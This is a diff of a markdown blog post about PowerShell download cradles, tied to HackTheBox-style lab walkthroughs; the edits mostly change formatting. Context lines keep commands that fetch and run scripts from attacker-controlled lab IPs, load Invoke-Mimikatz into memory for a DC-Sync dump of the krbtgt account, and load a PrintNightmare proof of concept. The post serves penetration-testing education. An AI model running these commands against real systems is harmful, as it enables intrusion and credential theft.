@@ -29,8 +29,6 @@ A PowerShell download cradle is a technique that enables downloading and executi
 ### Basic Syntax Example using Invoke-Mimikatz: {#basic-syntax-example-using-invoke-mimikatz}
 
 -   **Load Script into memory**:
-    -
-
     -   {{< figure src="/ox-hugo/2024-11-12-103931_.png" >}}
 
 -   **Running Invoke-Mimikatz from memory**:
@@ -236,7 +234,7 @@ Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "SecureDow
 
 -   {{< figure src="/ox-hugo/2024-11-12-100912_.png" >}}
 
--   ~~Notes~~: A custom user agent can also be passed:
+-   +Notes+: A custom user agent can also be passed:
     -   `-UserAgent "CompanyName/UpdateService"`
 
 
@@ -247,7 +245,7 @@ Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "SecureDow
 
 ### Monteverde Box: Extracting the Administrator Password for Azure: {#monteverde-box-extracting-the-administrator-password-for-azure}
 
--   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/monteverde-box/>
+-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/monteverde-box/>
 
 In this example, we used a download cradle to execute AdConnect exploitation directly in memory:
 
@@ -261,7 +259,7 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectP
 
 ### Certified Box: Advanced Mimikatz Usage to perform a DC-Sync Attack: {#certified-box-advanced-mimikatz-usage-to-perform-a-dc-sync-attack}
 
--   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/certified-box/> Coming soon (it's still in release arena. )
+-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/certified-box/> Coming soon (it's still in release arena. )
 -   Note this is not a spoiler as this is done post exploitation.
 
 
@@ -282,7 +280,7 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mim
 ```
 
 -   {{< figure src="/ox-hugo/2024-11-10-134628_.png" >}}
--   ~~Note~~: This will hang for a little bit, so just be patient.
+-   +Note+: This will hang for a little bit, so just be patient.
 
 
 #### Performing DC-Sync Attack {#performing-dc-sync-attack}
@@ -300,7 +298,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /doma
 
 ### Driver Box: Running PrintNightmare POC from a download cradle: {#driver-box-running-printnightmare-poc-from-a-download-cradle}
 
--   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )
+-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )
 
 -   **Start python server to host the script**:
     ```bash
@@ -308,7 +306,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /doma
     ```
 
     -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
-    -   ~~Note~~: I have this command aliased to `pws`
+    -   +Note+: I have this command aliased to `pws`
 
 -   **Use the download cradle to load the POC directly into memory**:
     ```powershell
